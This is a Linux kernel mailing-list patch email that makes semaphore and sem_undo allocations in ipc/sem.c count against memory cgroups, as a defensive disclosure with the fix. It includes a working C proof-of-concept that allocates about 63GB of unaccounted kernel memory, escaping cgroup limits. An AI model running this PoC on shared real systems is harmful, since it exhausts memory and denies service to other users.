From: Yutian Yang <nglaive-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>
Subject: [PATCH] memcg: charge semaphores and sem_undo objects
Date: Thu, 15 Jul 2021 03:14:44 -0400
Message-ID: <1626333284-1404-1-git-send-email-nglaive@gmail.com>
Return-path: <cgroups-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=from:to:cc:subject:date:message-id;
        bh=mRV8T0Y7cNn0dZ1dErTOtwAnuaw6Z0Qy+uCvTtEyaTo=;
        b=vFtzqUBvmddAmZZqsG14TK4QWHXiT5KHj9HFC8vgyb5hrS2/dp1iWg8Xn9XR1PVMje
         RIbuEwx43xdyXeI3tmOlilqZnDIMbgOibBHvyTaSmaYLNFfz2oMkQob1ZXlRZZgYAiHs
         LAWwumRlpNxmON9Cq1aD18fpN9qTntofk5f4ADQCynWnEUntwteGhIwMTNjFhLb2B2Pp
         RrRlj7VYqj1N5iCTLftMz9i9xbHl3a97tsOyOvXouaXjECHyX8oaT2ZY3RwNha4UXRXn
         DZRDhgqamNZ6gJTGd1MdLTgr+mK1B1IgPwiOyw+z8nyzSw8v+r/TPT9r8sR0xVgUuY+n
         gGCg==
List-ID: <cgroups.vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
To: mhocko-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org, hannes-druUgvl0LCNAfugRpC6u6w@public.gmane.org, vdavydov.dev-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org
Cc: cgroups-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, linux-mm-Bw31MaZKKs3YtjvyW6yDsg@public.gmane.org, shenwenbo-Y5EWUtBUdg4nDS1+zs4M5A@public.gmane.org, Yutian Yang <nglaive-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>

This patch adds accounting flags to semaphores and sem_undo allocation
sites so that kernel could correctly charge these objects. 

A malicious user could take up more than 63GB unaccounted memory under 
default sysctl settings by exploiting the unaccounted objects. She could 
allocate up to 32,000 unaccounted semaphore sets with up to 32,000 
unaccounted semaphore objects in each set. She could further allocate one 
sem_undo unaccounted object for each semaphore set.

The following code shows a PoC that takes ~63GB unaccounted memory, while 
it is charged for only less than 1MB memory usage. We evaluate the PoC on 
QEMU x86_64 v5.2.90 + Linux kernel v5.10.19 + Debian buster. 

/*------------------------- POC code ----------------------------*/
#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/stat.h>
#include <time.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <sched.h>

#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)

int main(int argc, char *argv[]) {
  int err, semid;
  struct sembuf sops;
  for (int i = 0; i < 31200; ++i) {
    semid = semget(IPC_PRIVATE, 31200, IPC_CREAT);
    if (semid == -1) {
      errExit("semget");
    }
    sops.sem_num = 0;
    sops.sem_op = 1;
    sops.sem_flg = SEM_UNDO;
    err = semop(semid, &sops, 1);
    if (err == -1) {
      errExit("semop");
    }
  }
  while(1);
  return 0;
}
/*-------------------------- end --------------------------------*/

Thanks!

Yutian Yang,
Zhejiang University

Signed-off-by: Yutian Yang <nglaive-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>
---
 ipc/sem.c | 4 ++--
 1 file changed, 2 insertions(+), 2 deletions(-)

diff --git a/ipc/sem.c b/ipc/sem.c
index f6c30a85d..6860de0b1 100644
--- a/ipc/sem.c
+++ b/ipc/sem.c
@@ -511,7 +511,7 @@ static struct sem_array *sem_alloc(size_t nsems)
 	if (nsems > (INT_MAX - sizeof(*sma)) / sizeof(sma->sems[0]))
 		return NULL;
 
-	sma = kvzalloc(struct_size(sma, sems, nsems), GFP_KERNEL);
+	sma = kvzalloc(struct_size(sma, sems, nsems), GFP_KERNEL_ACCOUNT);
 	if (unlikely(!sma))
 		return NULL;
 
@@ -1935,7 +1935,7 @@ static struct sem_undo *find_alloc_undo(struct ipc_namespace *ns, int semid)
 	rcu_read_unlock();
 
 	/* step 2: allocate new undo structure */
-	new = kzalloc(sizeof(struct sem_undo) + sizeof(short)*nsems, GFP_KERNEL);
+	new = kzalloc(sizeof(struct sem_undo) + sizeof(short)*nsems, GFP_KERNEL_ACCOUNT);
 	if (!new) {
 		ipc_rcu_putref(&sma->sem_perm, sem_rcu_free);
 		return ERR_PTR(-ENOMEM);
-- 
2.25.1

